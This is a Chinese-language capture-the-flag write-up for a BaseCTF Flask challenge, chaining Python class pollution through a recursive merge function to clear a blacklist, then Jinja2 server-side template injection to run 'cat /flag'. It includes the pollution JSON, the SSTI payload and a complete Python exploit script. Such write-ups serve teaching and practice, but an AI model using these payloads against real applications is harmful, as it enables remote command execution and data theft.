---
title: "JinjaMark"
date: "2026-04-09T00:00:00+08:00"
lastmod: "2026-04-09T00:00:00+08:00"
slug: "JinjaMark"
summary: "jinjamark"
tags:
  - "SSTI"
  - "Jinja2"
  - "Prototype Pollution"
params:
  protected: false
  commentId: "JinjaMark"
  legacyId: "JinjaMark"
---

# jinjamark

/index

尝试ssti：Hello 别急着ssti注入嘛，先去/magic那里给我变个魔术

/flag

直接bp爆破数字，得到：

```python
BLACKLIST_IN_index = ['{','}']
def merge(src, dst):
    for k, v in src.items():
        if hasattr(dst, '__getitem__'):#hasattr() 函数用于判断对象是否包含对应的属性。
            if dst.get(k) and type(v) == dict:
                merge(v, dst.get(k))
            else:
                dst[k] = v
        elif hasattr(dst, k) and type(v) == dict:
            merge(v, getattr(dst, k))
        else:
            setattr(dst, k, v)
@app.route('/magic',methods=['POST', 'GET'])
def pollute():
    if request.method == 'POST':
        if request.is_json:
            merge(json.loads(request.data), instance)
            return "这个魔术还行吧"
        else:
            return "我要json的魔术"
    return "记得用POST方法把魔术交上来"
```

分析，依旧使用了merge合并为字典，于是可以进行修改最后的blacklist的值

```
利用__class__返回该对象所属的类
利用__init__拿到初始化函数
利用__globals__得到所有的函数相关的方法
最后改变其中BLACKLIST_IN_index的值
```

构造：

```json
{
    "__class__":{
        "__init__":{
            "__globals__":{
                "BLACKLIST_IN_index" : []
            }
        }
    }
}
```

污染使得index可以执行ssti语句：

```json
{{lipsum.__globals__.os.popen('cat /flag').read()}}
```

## Flag

```
BaseCTF{j1nja_pr0t0_p0llut10n_2_rce}
```

## Exp

```python
import requests

url = "http://challenge.imxbt.cn:32101"

# Step 1: Prototype pollution to clear blacklist
s = requests.Session()
s.post(f"{url}/magic", json={
    "__class__": {
        "__init__": {
            "__globals__": {
                "BLACKLIST_IN_index": []
            }
        }
    }
})

# Step 2: SSTI to RCE
r = s.post(f"{url}/index", data={
    "name": "{{lipsum.__globals__.os.popen('cat /flag').read()}}"
})
print(r.text)
```

